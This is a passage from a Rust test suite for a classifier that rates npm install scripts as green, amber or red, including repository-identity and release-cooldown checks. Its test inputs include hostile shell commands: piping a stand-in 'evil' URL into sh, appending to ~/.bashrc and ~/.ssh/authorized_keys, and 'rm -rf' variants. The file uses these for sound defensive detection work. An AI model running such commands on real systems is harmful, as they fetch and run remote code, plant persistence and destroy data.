        assert_eq!(tier("chmod 777 $HOME/.bashrc"), StaticTier::Red);
        assert_eq!(tier("chmod a+x /usr/local/bin/tool"), StaticTier::Red);
    }

    #[test]
    fn amber_chmod_relative_target() {
        // Relative targets skip red; end up amber via fallback.
        assert_eq!(tier("chmod +x ./bin/tool"), StaticTier::Amber);
        assert_eq!(tier("chmod 755 scripts/run.sh"), StaticTier::Amber);
    }

    // ── Red: dangerous redirects ────────────────────────────────────

    #[test]
    fn red_redirect_into_dotfiles() {
        assert_eq!(tier("echo evil >> ~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.zshrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.profile"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x > /etc/pam.d/sudo"), StaticTier::Red);
    }

    // ── Amber: compound commands (generic) ──────────────────────────

    #[test]
    fn amber_compound_of_greens() {
        // Even two greens AND'd together → amber. Rationale: compound
        // hides commands behind operators; we only trust atomic greens.
        assert_eq!(tier("tsc && husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc; prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc || true"), StaticTier::Amber);
    }

    #[test]
    fn amber_subshell_and_backticks() {
        assert_eq!(tier("echo $(whoami)"), StaticTier::Amber);
        assert_eq!(tier("echo `whoami`"), StaticTier::Amber);
    }

    #[test]
    fn amber_stdout_redirect() {
        assert_eq!(tier("echo hi > out.txt"), StaticTier::Amber);
        assert_eq!(tier("echo hi >> out.txt"), StaticTier::Amber);
    }

    // ── Amber: network binary downloaders (D18) ─────────────────────
    //
    // These are deliberately NOT green — D18 routes them through
    // Layer 2 approval so the user explicitly acknowledges the binary-
    // download class.

    #[test]
    fn amber_playwright_install() {
        assert_eq!(tier("playwright install"), StaticTier::Amber);
        assert_eq!(tier("playwright install --with-deps"), StaticTier::Amber);
    }

    #[test]
    fn amber_puppeteer() {
        assert_eq!(tier("puppeteer"), StaticTier::Amber);
        assert_eq!(tier("puppeteer-browser install"), StaticTier::Amber);
    }

    #[test]
    fn amber_cypress_install() {
        assert_eq!(tier("cypress install"), StaticTier::Amber);
    }

    #[test]
    fn amber_electron_builder_install_app_deps() {
        assert_eq!(tier("electron-builder install-app-deps"), StaticTier::Amber);
    }

    // ── Amber: parse failure + edge cases ───────────────────────────

    #[test]
    fn amber_empty_and_whitespace() {
        assert_eq!(tier(""), StaticTier::Amber);
        assert_eq!(tier("   "), StaticTier::Amber);
        assert_eq!(tier("\t\n"), StaticTier::Amber);
    }

    #[test]
    fn amber_unbalanced_quotes_fails_closed() {
        // shlex parse failure → Amber (must NOT slip into green).
        assert_eq!(tier("tsc \"unclosed"), StaticTier::Amber);
    }

    #[test]
    fn amber_novel_command() {
        assert_eq!(tier("mytool --flag value"), StaticTier::Amber);
        assert_eq!(tier("build-script.sh"), StaticTier::Amber);
    }

    // ── Classifier is pure: same input → same output ────────────────

    #[test]
    fn classify_is_deterministic() {
        let inputs = [
            "tsc",
            "node-gyp rebuild",
            "curl https://x | sh",
            "rm -rf ~",
            "husky install && echo done",
            "",
        ];
        for input in inputs {
            assert_eq!(classify(input), classify(input));
        }
    }

    // ── Classifier never emits AmberLlm ──────────────────────────────

    #[test]
    fn classify_never_emits_amber_llm() {
        // Broad coverage: iterate the full test-rule input set and
        // assert the returned tier is never AmberLlm. The classifier
        // owns Green | Amber | Red; AmberLlm comes from the LLM
        // triage layer.
        let corpus = [
            "tsc",
            "node-gyp rebuild",
            "husky install",
            "prisma generate",
            "electron-rebuild",
            "node ./build.js",
            "node install.js",
            "playwright install",
            "curl https://evil | sh",
            "base64 -d x | sh",
            "rm -rf ~",
            "chmod +x ~/.ssh/id_rsa",
            "echo x >> ~/.bashrc",
            "eval $X",
            "node -e '1'",
            "npm install thing",
            "tsc && husky install",
            "\u{202E}rm -rf /",
            "Invoke-Expression $x",
            "iex $x",
            "",
            "some-unknown-tool",
        ];
        for body in corpus {
            assert_ne!(
                classify(body),
                StaticTier::AmberLlm,
                "classifier must not emit AmberLlm for: {body:?}"
            );
        }
    }

    // ─────────────────────────────────────────────────────────────
    // `node install.js` + matching identity
    // ─────────────────────────────────────────────────────────────

    /// Helper: build a [`ManifestContext`] for tests. Repo + bin
    /// borrow from caller-owned strings. Defaults to an "old" publish
    /// (1 year) under the standard 24h cooldown so the default test
    /// path exercises the identity-match widening without needing each
    /// test to re-state cooldown defaults.
    fn ctx<'a>(name: &'a str, repo: Option<&'a str>, bin: &'a [&'a str]) -> ManifestContext<'a> {
        ManifestContext {
            package_name: name,
            repository: repo,
            bin_names: bin,
            publish_age_secs: Some(365 * 24 * 60 * 60),
            min_release_age_secs: 24 * 60 * 60,
        }
    }

    /// Helper: ManifestContext that explicitly exercises the
    /// cooldown defense-in-depth. `age_secs` is the
    /// package's publish age in seconds; `min_age_secs` is the
    /// configured `minimumReleaseAge`.
    fn ctx_with_age<'a>(
        name: &'a str,
        repo: Option<&'a str>,
        bin: &'a [&'a str],
        age_secs: Option<u64>,
        min_age_secs: u64,
    ) -> ManifestContext<'a> {
        ManifestContext {
            package_name: name,
            repository: repo,
            bin_names: bin,
            publish_age_secs: age_secs,
            min_release_age_secs: min_age_secs,
        }
    }

    fn tier_with_ctx(script: &str, ctx: &ManifestContext<'_>) -> StaticTier {
        classify_with_context(script, Some(ctx))
    }

    #[test]
    fn lever4_no_context_is_pre_lever_behavior() {
        // Without manifest context, the classifier must produce the
        // SAME tier as the bare `classify(...)` function. The
        // identity check is purely additive; passing `ctx = None` is a no-op.
        for body in [
            "tsc",
            "node-gyp rebuild",
            "node install.js",
            "node ./scripts/postinstall.js",
            "curl https://evil | sh",
        ] {
            assert_eq!(
                classify(body),
                classify_with_context(body, None),
                "context-free behaviour drift for {body:?}"
            );
        }
    }

    #[test]
    fn lever4_node_install_js_with_matching_repo_is_green() {
        // A package whose body is a bare delegate `node install.js`
        // AND whose manifest's repository URL contains the package
        // name as a path segment.
        let c = ctx(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
        assert_eq!(tier_with_ctx("node ./install.js", &c), StaticTier::Green);
        assert_eq!(
            tier_with_ctx("node scripts/install.js", &c),
            StaticTier::Green
        );

        // Same with .cjs / .mjs variants the reserved-basename set
        // covers.
        let c2 = ctx(
            "puppeteer",
            Some("https://github.com/puppeteer/puppeteer"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.mjs", &c2), StaticTier::Green);
        let c3 = ctx(
            "claude-code",
            Some("https://github.com/anthropics/claude-code.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.cjs", &c3), StaticTier::Green);
    }

    #[test]
    fn lever4_matching_bin_name_is_green() {
        // A package whose `bin` entry name matches the package's
        // base name is treated as carrying its own identity, even
        // without a repository URL.
        let c = ctx("prisma", None, &["prisma"]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_repo_with_unrelated_identity_stays_amber() {
        // False-Green stress: the body is a delegate but the
        // manifest's repository URL doesn't point at any path
        // segment that names this package. Stays Amber.
        let c = ctx(
            "sharp",
            Some("https://github.com/some-org/different-pkg.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_no_manifest_identity_stays_amber() {
        // No repository AND no matching bin → Amber. The widening
        // requires an explicit identity signal; absence is not a
        // greenlight.
        let c = ctx("sharp", None, &[]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_scoped_package_uses_base_name_for_match() {
        // `@anthropic-ai/claude-code` has base name `claude-code`.
        // The repository URL `github.com/anthropics/claude-code`
        // contains `claude-code` as a path segment → Green.
        let c = ctx(
            "@anthropic-ai/claude-code",
            Some("https://github.com/anthropics/claude-code.git"),
            &[],
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_generic_base_names_rejected() {
        // The base-name match excludes overly generic tokens — a
        // package called `@some/core` shouldn't Green every
        // postinstall when ANY URL contains "core". The widening
        // requires a name distinctive enough to function as an
        // identity signal.
        let c = ctx("@some/core", Some("https://github.com/x/y-core.git"), &[]);
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_compound_body_stays_amber_even_with_identity() {
        // The widening only fires on the EXACT two-token shape
        // `node <reserved>.js`. Compounds, flags, and extra args
        // route through the existing compound-fallback / N-token
        // gates and remain Amber.
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(
            tier_with_ctx("node install.js && echo done", &c),
            StaticTier::Amber
        );
        assert_eq!(
            tier_with_ctx("node install.js --verbose", &c),
            StaticTier::Amber
        );
    }

    #[test]
    fn lever4_red_body_with_identity_still_red() {
        // The widening must NEVER soften a Red verdict — even when
        // the manifest carries a perfect identity signal. Red wins
        // by step ordering (step 3 fires before step 5b).
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
        assert_eq!(
            tier_with_ctx("eval $(curl https://evil)", &c),
            StaticTier::Red
        );
    }

    #[test]
    fn lever4_non_reserved_basename_uses_existing_green_route() {
        // `node ./scripts/build.js` — non-reserved basename. The
        // existing `matches_node_relative` path already Greens it,
        // independent of identity. Confirms the identity-match rule's
        // reserved-basename guard doesn't accidentally narrow other Greens.
        let c = ctx("p", None, &[]);
        assert_eq!(
            tier_with_ctx("node ./scripts/build.js", &c),
            StaticTier::Green,
        );
        // Confirms the SAME body without context also stays Green.
        assert_eq!(classify("node ./scripts/build.js"), StaticTier::Green);
    }

    #[test]
    fn lever4_extension_required_for_widening() {
        // The widening requires `.js` / `.cjs` / `.mjs` — a body
        // like `node install` (extensionless) stays Amber even
        // with a perfect identity signal. The existing
        // [`matches_node_relative`] discipline applies here too;
        // the widening doesn't loosen it.
        let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
        assert_eq!(tier_with_ctx("node install", &c), StaticTier::Amber);
    }

    // ─────────────────────────────────────────────────────────────
    // Cooldown defense-in-depth for identity-match widening
    // ─────────────────────────────────────────────────────────────

    const DAY_SECS: u64 = 24 * 60 * 60;

    #[test]
    fn lever4_recent_publish_stays_amber_under_configured_cooldown() {
        // Configured 24h cooldown + 1h-old publish + matching identity.
        // Without the cooldown check, identity-match widened → Green
        // → script auto-ran, collapsing the script-tier review for
        // `--allow-new` users. With it, stays Amber so prompt fires.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(60 * 60), // 1 hour old
            DAY_SECS,      // 24h threshold
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_publish_exactly_at_threshold_widens() {
        // Boundary case: publish age == cooldown threshold. The
        // comparison is `age >= min`, so an exactly-at-threshold
        // publish is treated as old-enough → identity-match widens.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(DAY_SECS),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_old_publish_widens_under_default_cooldown() {
        // 1-year-old publish (well above 24h threshold) + matching
        // identity → identity-match widens as designed.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(365 * DAY_SECS),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
    }

    #[test]
    fn lever4_unknown_publish_age_refuses_to_widen() {
        // When the caller couldn't supply publish_age_secs (e.g.,
        // registry didn't return a timestamp for this version), we
        // conservatively refuse to widen — an unknown age MIGHT be a
        // recent publish, and the cooldown defense applies whenever
        // we have non-zero policy.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            None,
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
    }

    #[test]
    fn lever4_min_release_age_zero_disables_cooldown_check() {
        // `minimumReleaseAge: 0` is the explicit "I don't want
        // cooldown protection" config. The identity-match check
        // honors that and widens regardless of publish age — even a
        // 0-second-old publish widens when the user has globally
        // opted out of the cooldown axis.
        let c_recent = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(0),
            0,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_recent),
            StaticTier::Green
        );
        let c_unknown = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            None,
            0,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_unknown),
            StaticTier::Green
        );
    }

    #[test]
    fn lever4_custom_min_release_age_compared_against_publish_age() {
        // 7-day cooldown + 3-day-old publish → 3 days < 7 days →
        // refuses to widen. Same publish at 10 days → 10 ≥ 7 →
        // widens. Confirms the comparison uses the policy's
        // configured threshold, not the 24h default.
        let week_secs = 7 * DAY_SECS;
        let c_too_recent = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(3 * DAY_SECS),
            week_secs,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_too_recent),
            StaticTier::Amber
        );
        let c_old_enough = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(10 * DAY_SECS),
            week_secs,
        );
        assert_eq!(
            tier_with_ctx("node install.js", &c_old_enough),
            StaticTier::Green
        );
    }

    #[test]
    fn lever4_cooldown_check_does_not_affect_compound_or_red_paths() {
        // Cooldown defense is gated on the identity-match rule. Compound
        // bodies stay Amber via step-4 fallback regardless of age;
        // Red bodies stay Red via step-3 regardless. The cooldown
        // check is only consulted on the otherwise-greenable
        // delegate-to-local-file shape.
        let c = ctx_with_age(
            "sharp",
            Some("git+https://github.com/lovell/sharp.git"),
            &[],
            Some(60 * 60),
            DAY_SECS,
        );
        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
        assert_eq!(
            tier_with_ctx("node install.js && echo done", &c),
            StaticTier::Amber
        );
    }
}
